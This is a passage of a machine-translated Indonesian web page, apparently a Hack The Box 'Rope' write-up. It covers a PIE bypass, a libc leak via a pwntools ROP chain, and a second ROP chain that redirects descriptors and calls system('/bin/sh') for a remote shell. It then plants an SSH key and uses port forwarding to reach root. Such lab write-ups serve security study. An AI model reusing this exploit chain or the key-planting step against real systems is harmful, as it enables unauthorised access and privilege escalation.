<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.PIE</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang mari kita berurusan dengan PIE. </font><font style="vertical-align: inherit;">Kami menemukan RIP - ini adalah alamat pengirim tempat kami kembali dari fungsinya. </font><font style="vertical-align: inherit;">Dengan demikian, kita dapat mengurangi dari itu alamat pengirim dalam kode. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/te/t7/lu/tet7luif_rfxtdpgk8cw1a6wat8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, offset dari pangkalan adalah 0x1562. </font><font style="vertical-align: inherit;">Mari kita tunjukkan alamat asli dari aplikasi yang sedang berjalan.</font></font><br>
<br>
<pre><code class="python hljs">base_binary = u64(RIP) - <span class="hljs-number">0x1562</span>
binary = ELF(<span class="hljs-string">'./contact'</span>)<font></font>
binary.address = base_binary<font></font>
libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. Memori kebocoran</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aplikasi menggunakan fungsi write () standar untuk menampilkan string prompt, yang mengambil pegangan untuk output, buffer, dan ukurannya. </font><font style="vertical-align: inherit;">Kita dapat menggunakan fungsi ini. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk kenyamanan, mari gunakan modul ROP dari pwntools. </font><font style="vertical-align: inherit;">Secara singkat, bagaimana dan mengapa ini berfungsi disajikan pada gambar di bawah ini. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/oh/md/bv/ohmdbvozmm5ve0zayx1imk5v-0a.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita bocor, ini akan memberi tahu kita apa alamat fungsi tulis di perpustakaan libc yang dimuat.</font></font><br>
<br>
<pre><code class="python hljs">rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x4</span>, binary.got[<span class="hljs-string">'write'</span>], <span class="hljs-number">0x8</span>)<font></font>
send_leak = pre_payload + flat(rop_binary.build())<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendafter(<span class="hljs-string">b"admin:"</span>, send_leak)<font></font>
leak = r.recvall().strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)<font></font>
print(<span class="hljs-string">f"Leak: <span class="hljs-subst">{hex(u64(leak))}</span>"</span>)<font></font>
base_libc = leak - libc.symbols[<span class="hljs-string">'write'</span>]
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. BATU</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita ubah alamat pangkalan perpustakaan libc dan temukan alamat dari baris / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">libc.address = base_libc<font></font>
shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetap mengumpulkan ROP, di mana deskriptor I / O standar (0,1,2) akan dialihkan ke deskriptor yang terdaftar dalam program (4). </font><font style="vertical-align: inherit;">Setelah itu fungsi sistem akan dipanggil, di mana kita akan melewati alamat baris / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
<font></font>
payload = pre_payload + flat(rop_libc.build())<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendafter(<span class="hljs-string">b"admin:"</span>, payload)<font></font>
time.sleep(<span class="hljs-number">2</span>)<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
6. Operasi </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
kode eksploitasi penuh. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hm/ta/sd/hmtasdfdb2vvug5doqfdkfzeho4.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang di server, tulis kunci ssh ke file /home/r4j/.ssh/authorizef_keys. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ze/e2/7v/zee27vga9_skxu2ruepdreh0hxm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan teruskan port (pastikan bahwa koneksi dari port lokal 1337 dialihkan melalui SSH ke port 1337 dari host jarak jauh).</font></font><br>
<br>
<pre><code class="bash hljs">ssh -L 1337:127.0.0.1:1337 -i id_rsa r4j@rope.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan luncurkan exploit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/cy/m5/mvcym58okghfhc1ngkz9oovt4-4.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami bekerja di bawah root. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Di sana Anda dapat menemukan materi yang menarik, kursus yang digabungkan, serta perangkat lunak. </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id503404/index.html">Sistem Digital Semantik</a></li>
<li><a href="../id503406/index.html">Semantik dan aktivitas</a></li>
<li><a href="../id503408/index.html">Toko Online Sisi Klien Blazor: Bagian 7 - Diperbarui untuk merilis versi 3.2.0 dan tampilan gambar yang ditambahkan</a></li>
<li><a href="../id503410/index.html">Poligon Dunia Lain: Sega Genesis</a></li>
<li><a href="../id503412/index.html">Project Loom: Java virtual threads sudah dekat</a></li>
<li><a href="../id503420/index.html">Lemmatize lebih cepat (PyMorphy2, PyMystem3 dan beberapa sihir)</a></li>
<li><a href="../id503426/index.html">44,2 Tb / s lebih dari serat - bagaimana cara kerjanya?</a></li>
<li><a href="../id503428/index.html">Cara Meningkatkan Bahasa Inggris Tertulis untuk Komunikasi di Luar Negeri: Proyek Bisnis Linguix</a></li>
<li><a href="../id503430/index.html">Gateway MS Desktop Jarak Jauh, menebak HAProxy dan kata sandi</a></li>
<li><a href="../id503432/index.html">Cross-platform multi-threaded TCP / IP server di C ++</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>